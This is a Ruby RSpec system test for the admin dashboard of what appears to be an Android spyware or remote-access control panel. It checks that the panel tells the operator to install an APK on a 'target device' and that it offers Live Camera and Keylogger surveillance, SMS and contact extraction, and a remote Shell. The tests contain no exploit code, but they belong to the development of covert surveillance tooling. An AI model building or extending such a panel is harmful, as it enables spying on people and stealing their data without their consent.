# frozen_string_literal: true

require 'rails_helper'

RSpec.describe 'Admin Dashboard', type: :system do
  let!(:admin) { AdminUser.create!(email: 'admin@example.com', password: 'password123456', password_confirmation: 'password123456') }

  before do
    admin_login
  end

  describe 'login flow' do
    # Login is tested implicitly by the before block — verify we land on admin.
    it 'redirects to the admin root after login' do
      expect(page).to have_current_path(%r{/admin})
    end
  end

  context 'when no devices are installed' do
    it 'shows the empty-state message' do
      visit admin_dashboard_path
      expect(page).to have_text('Waiting for Devices')
      expect(page).to have_text('Install the APK on a target device')
    end
  end

  context 'when devices are present' do
    let!(:device) { create_installed_device(name: 'E2E Phone', device_id: 'e2e-dash-001') }

    before { visit admin_dashboard_path }

    it 'displays the stats grid with counts' do
      expect(page).to have_css('.stats-grid')
      expect(page).to have_css('.stat-card', minimum: 1)
      expect(page).to have_text('Devices')
    end

    it 'renders a device card with the device name' do
      expect(page).to have_css('.device-card', minimum: 1)
      expect(page).to have_text('E2E Phone')
    end

    it 'shows online/offline status indicator' do
      expect(page).to have_css('.device-status')
    end

    describe 'tab navigation on device card' do
      it 'switches between Surveillance, Data, Control, AI, and Analytics tabs' do
        %w[Data Control AI Analytics].each do |tab|
          click_tab(tab)
          expect(page).to have_css('.tab-pane.active', visible: true)
        end
      end

      it 'shows surveillance actions on the default tab' do
        expect(page).to have_text('Live Camera')
        expect(page).to have_text('Keylogger')
      end

      it 'shows data extraction actions on the Data tab' do
        click_tab('Data')
        expect(page).to have_text('SMS')
        expect(page).to have_text('Contacts')
      end

      it 'shows control actions on the Control tab' do
        click_tab('Control')
        expect(page).to have_text('Shell')
        expect(page).to have_text('Toggle WiFi')
      end

      it 'shows AI actions on the AI tab' do
        click_tab('AI')
        expect(page).to have_text('AI Chat')
        expect(page).to have_text('AI Analysis')
      end

      it 'shows per-device analytics on the Analytics tab' do
        click_tab('Analytics')
        expect(page).to have_css('.analytics-grid')
      end
    end
  end

  describe 'responsive layout' do
    let!(:device) { create_installed_device(name: 'Responsive Phone', device_id: 'e2e-resp-001') }

    it 'renders correctly at mobile viewport (375×667)' do
      page.driver.browser.manage.window.resize_to(375, 667)
      visit admin_dashboard_path
      expect(page).to have_css('.device-card', minimum: 1)
    end

    it 'renders correctly at tablet viewport (768×1024)' do
      page.driver.browser.manage.window.resize_to(768, 1024)
      visit admin_dashboard_path
      expect(page).to have_css('.device-card', minimum: 1)
    end

    after do
      page.driver.browser.manage.window.resize_to(1440, 900)
    end
  end

  describe 'loading states and toast notifications' do
    let!(:device) { create_installed_device(name: 'Toast Phone', device_id: 'e2e-toast-001') }

    it 'has a toast container ready for command feedback' do
      visit admin_dashboard_path
      expect(page).to have_css('#toast-container')
    end

    it 'displays toast on simulated AJAX success via JS' do
      visit admin_dashboard_path
      page.execute_script("window.showToast('Test success', 'success')")
      expect(page).to have_css('.toast-success', text: 'Test success')
    end

    it 'displays error toast via JS' do
      visit admin_dashboard_path
      page.execute_script("window.showToast('Test error', 'error')")
      expect(page).to have_css('.toast-error', text: 'Test error')
    end
  end
end
